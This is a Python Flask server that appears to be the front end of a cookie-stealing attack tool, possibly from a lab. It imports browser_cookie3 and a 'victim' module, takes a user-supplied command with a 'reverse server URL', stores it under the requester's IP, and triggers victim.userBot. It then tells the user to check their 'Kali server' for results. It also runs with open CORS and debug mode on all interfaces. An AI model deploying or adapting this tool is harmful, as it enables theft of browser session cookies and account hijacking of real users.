from flask import Flask, redirect, render_template, request, url_for, jsonify, make_response
import requests
import browser_cookie3
import re
import json
import random
import os
from flask_cors import CORS
import victim
from urllib.parse import urlparse


app = Flask(__name__)
CORS(app, resources={r"*": {"origins": "*"}})


@app.route("/")
@app.route("/index")
def index():
    return render_template('index.html')


@app.route("/getCookie/finish", methods=["GET"])
def finish():
    return '''<script>alert('Process finished. Please check your Kali server.');</script>'''


@app.route("/getCookie", methods=["POST", "GET"])
def getCookie():
    res_IP = jsonify({'ip': request.remote_addr})
    clientIP = json.loads(res_IP.data)['ip']
    print('--------------------------')
    print("Attacker's IP: ", clientIP)

    ans = request.form['nm']
    answer = {
        "cmd": ans
    }
    ans_search = re.search("(?P<url>https?://[^\s]+)", ans)
    if ans_search is not None:
        ans_URL = ans_search.group("url")
        ans_domain = urlparse(ans_URL).netloc
        # print(ans_domain)
        filename = clientIP + "_" + ans_domain

        with open(f'{filename}.json', 'w', encoding='utf-8') as f:
            json.dump(answer, f, ensure_ascii=False, indent=4)

        victim.userBot(filename)
    else:
        print('There are no URL matches')
        return render_template('index.html', result='Process finished. You need to add a reverse server URL.')

    return render_template('index.html', result='Process finished. Please check the message on your server.')


if __name__ == '__main__':
    app.run('0.0.0.0', port=5009, debug=True)
